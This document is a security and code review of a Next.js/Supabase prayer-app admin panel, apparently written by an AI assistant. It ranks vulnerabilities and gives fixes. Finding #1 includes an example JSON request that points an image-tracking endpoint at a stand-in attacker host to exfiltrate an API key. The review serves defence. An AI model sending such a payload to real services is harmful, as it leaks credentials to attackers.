# Prevail Prayer Admin — Full Review

**Date:** July 1, 2026
**Reviewer scope:** Every route, API endpoint, server action, middleware, and library file was read. Findings on database RLS are noted as *needs live verification* because the Prevail Supabase project is not in the connected account — I could not query its policies directly.

---

## Verdict First

The security foundation is genuinely good, and better than most admin panels I see. Every server action re-checks `requireAdmin()` instead of trusting middleware. Audit logging is consistent. The contributor password uses a timing-safe compare. Contributor submissions are hard-coded to `is_published: false`. Next.js is on 14.2.35, which is patched against the known middleware-bypass CVE.

That said, there are two real vulnerabilities in the public image API, a data-correctness bug that will silently break as you cross 1,000 users, a role that is half-wired, and no loading or error states anywhere. None are cosmetic. Fix list is below in priority order.

---

## CRITICAL — fix this week

### 1. `/api/images/track` leaks your Unsplash key and is a blind SSRF
**File:** `app/api/images/track/route.ts`

The route is public (middleware exempts `/api/images`). It takes a `downloadLocation` URL straight from the request body and fetches it **with your `UNSPLASH_ACCESS_KEY` in the Authorization header**. Anyone on the internet can send:

```json
{ "downloadLocation": "https://attacker.example/collect" }
```

and your key is delivered to their server. It also lets an attacker make your server fetch any URL they choose (blind SSRF).

**Fix:** validate the host before fetching.

```ts
const u = new URL(downloadLocation);
if (u.hostname !== "api.unsplash.com") {
  return NextResponse.json({ ok: false }, { status: 400 });
}
```

### 2. `/api/images/search` is an open, unauthenticated proxy for your API quota
**File:** `app/api/images/search/route.ts`

Anyone can hit this and burn your Unsplash/Pexels quota. Unsplash's demo tier is 50 requests/hour, so one bad actor takes image search offline for your writers. It is public only because the contribute page needs it, but the contribute page is already password-gated.

**Fix:** require either an admin session or the contributor password on both image routes. Simplest path: have the client send the contributor password in an `x-contrib-pass` header and verify it with the existing `checkPassword()` logic, falling back to a Supabase session check for admin use. Add a light per-IP rate limit while you are there.

---

## HIGH — fix before the user base grows

### 3. The 1,000-row cap will silently corrupt notifications, analytics, and engagement
**Files:** `lib/notify.ts` (`loadAudience`), `app/(dashboard)/analytics/page.tsx`, `app/(dashboard)/engagement/page.tsx`

Supabase/PostgREST returns **at most 1,000 rows per query** unless you paginate with `.range()`. These pages call `.select()` on `profiles` and the feature tables with no range. Today that is fine. The moment you pass 1,000 users:

- **Notifications** target only the first 1,000 profiles. Users past that row silently never get pushed.
- **Analytics** undercounts signups, plans, active users, everything.
- **Engagement** shows partial data.

The CSV export is fine — it sets `.limit(100000)`. Everything else needs the same treatment, or a batched fetch loop that pages through in chunks of 1,000.

**Fix:** add a small helper that loops `.range(from, from+999)` until a short page is returned, and use it everywhere you currently pull "all" rows.

### 4. This is also a performance problem
The analytics and engagement pages are `force-dynamic` and pull **every row of several tables into memory on every page load** to tally in JavaScript. At a few thousand users each visit gets slow and burns database egress. The correct long-term fix is to push the counting into SQL (a Postgres view or `count()`/`group by` queries, or an RPC), not to fetch-and-loop in Node. Ties directly into #3 — fix them together.

### 5. The editor role is half-wired and inconsistent
- **Middleware** lets an editor into `/devotions`, `/music`, `/scripture`.
- **Devotion, notification, site, feedback, AI-cost, settings actions** all reject editors (`me.admin_role === "editor"` → "Admins only"). So an editor can open the Devotions page but every save/delete fails.
- **Music actions** only check `is_admin` and do **not** exclude editors — so editors *can* fully manage music.
- **Scripture writes** happen in the browser with the anon key and check no role at all.

The result is an editor who can edit music and scripture but not devotions — the opposite of what the sidebar implies. Decide what an editor is actually allowed to do, then make middleware, the sidebar, and every action agree. Right now they don't.

### 6. Scripture management writes from the browser and swallows errors
**Files:** `app/(dashboard)/scripture/page.tsx`, `components/ui/ImportScriptures.tsx`

Every other content type writes through a server action with the service-role client and audit logging. Scripture is the exception: it writes directly from the browser with the anon-key client. `handleAdd` only acts `if (data)`; `handleDelete` and `toggleFeatured` don't check for errors at all and update the UI optimistically. If RLS rejects the write (needs live verification), the screen *looks* updated but nothing persisted — deletes reappear on reload, features never stick.

**Fix:** move scripture writes into server actions matching the rest of the app. That fixes silent failure, adds audit logging, and closes the editor-role gap in one move.

---

## MEDIUM — hardening and polish

### 7. No loading or error states anywhere
There is no `loading.tsx` or `error.tsx` in the app. Every dashboard page is `force-dynamic` and query-heavy, so navigation feels dead for a second or two with no feedback, and any thrown error is an unstyled Next.js crash page. Add a shared `loading.tsx` (skeleton) and `error.tsx` (friendly retry) at the dashboard-group level. Biggest single UX win for the least effort.

### 8. The contributor password can be brute-forced
**File:** `app/contribute/actions.ts`

`submitDevotion` is rate-limited by IP, but `verifyContributorPassword` is not. An attacker can guess the shared password unlimited times. The compare is timing-safe, but nothing stops volume. Add the same per-IP attempt limit (and a short lockout) to the verify path.

### 9. Storage buckets are created on every upload and are public
**Files:** `app/(dashboard)/music/actions.ts`, `app/contribute/actions.ts`

Each upload calls `createBucket(..., { public: true })` inside a try/catch. It works, but it means buckets are world-readable and the create call fires needlessly every time. Create the buckets once during setup with an explicit policy, and drop the per-upload create.

### 10. Pages trust middleware alone for read authorization
Server components like Overview, Users, Analytics, and Engagement instantiate the service-role client and read all-user data **without calling `requireAdmin()`** — they rely entirely on middleware to have blocked non-admins. That is true today, but it is a single point of failure. If the middleware matcher is ever changed, these pages leak full user data. Cheap defense-in-depth: have read pages confirm the session's admin flag too, the way the actions already do.

### 11. `x-forwarded-for` is spoofable
The contribute rate limiter reads the first `x-forwarded-for` value, which a client can forge. On Vercel, prefer the platform-provided client IP. Low severity because it only weakens a rate limit, but worth knowing.

### 12. Minor correctness notes
- **32 MB server-action body limit** is global (`next.config.js`), so the password-gated contribute page also accepts 32 MB posts. The 8 MB image check happens after the body is received. Acceptable, but a smaller public limit would be safer.
- **`mdToHtml`** (site editor preview) escapes `&<>` and only allows `http(s)`/`mailto` links, so the `dangerouslySetInnerHTML` use is low-risk and admin-only. Fine as-is; just don't loosen the escaping.

---

## What's already done well (keep it)

- Per-action `requireAdmin()` instead of middleware-only trust.
- Consistent, non-throwing audit logging that never breaks the action it records.
- Timing-safe contributor password compare, stored as a hash, admin-settable with an env fallback.
- Contributor submissions forced to unpublished — contributors can never publish.
- Sensible CSV injection guard on the user search (`.replace(/[,()*:\\%]/g, "")`).
- Patched Next.js version.

---

## Suggested order of work

| Priority | Item | Effort |
|---|---|---|
| 1 | #1 Fix image `track` SSRF/key leak | 15 min |
| 2 | #2 Gate image `search` behind auth/password + rate limit | 1–2 hrs |
| 3 | #3 Paginate all "fetch everything" queries | 2–4 hrs |
| 4 | #6 Move scripture writes to server actions | 2–3 hrs |
| 5 | #5 Make the editor role coherent end to end | 2–3 hrs |
| 6 | #7 Add `loading.tsx` and `error.tsx` | 1–2 hrs |
| 7 | #4 Push analytics/engagement counting into SQL | 1 day |
| 8 | #8–#11 Hardening pass | half day |

**Also verify against the live database** (I could not, since the project isn't in the connected Supabase account): RLS on `scripture_verses` write commands, and run the Supabase Security Advisor. That confirms or rules out finding #6's root cause.
